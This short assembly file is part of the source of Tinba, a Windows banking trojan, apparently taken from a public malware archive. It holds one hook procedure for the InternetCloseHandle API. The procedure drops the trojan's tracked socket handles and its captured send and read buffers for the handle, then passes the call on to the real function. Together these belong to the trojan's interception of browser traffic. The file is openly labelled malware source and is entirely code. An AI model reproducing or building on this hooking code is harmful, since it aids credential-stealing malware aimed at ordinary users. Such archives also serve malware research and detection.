; ------------------------------------------------------------
; name      Tinba
; type      trojan
; cve       —
; year      unknown
; os        Windows
; authors   unknown
; source    RamadhanAmizudin/malware
; archived  RamadhanAmizudin, krisyotam (2026)
; notes     —
; ------------------------------------------------------------

.code

;; ==================================================================================================== ;;
;; hInternetCloseHandle is a InternetCloseHandle handler procedure                                      ;;
;; ==================================================================================================== ;;
hInternetCloseHandle proc uses ebx p1 : dword

	GetBaseDelta ebx

	invokx  &ArrayKeyDel[ebx], lpSockHandlesArray[ebx], p1
	invokx  &ArrayKeyDel[ebx], lpSendBuffersArray[ebx], p1
	invokx  &ArrayKeyDel[ebx], lpReadBuffersArray[ebx], p1

	invokx  _InternetCloseHandle[ebx], p1

	ret
hInternetCloseHandle endp

